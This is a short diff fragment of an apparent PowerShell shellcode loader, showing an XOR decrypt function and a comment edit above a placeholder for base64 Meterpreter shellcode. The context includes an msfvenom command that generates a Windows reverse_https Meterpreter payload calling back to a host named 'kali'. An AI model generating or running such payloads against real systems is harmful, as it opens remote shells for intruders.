@@ -74,7 +74,7 @@ function Invoke-XorDecrypt {
     return $Data
 }
 
-# --- Meterpreter Shellcode (Replace with Your Base64 Payload) ---
+#  Meterpreter Shellcode (Replace with Your Base64 Payload)
 $Base64Payload = @"
 # GENERATE WITH: msfvenom -p windows/x64/meterpreter/reverse_https LHOST=kali LPORT=443 -f base64
 # Example (fake shellcode for demo):
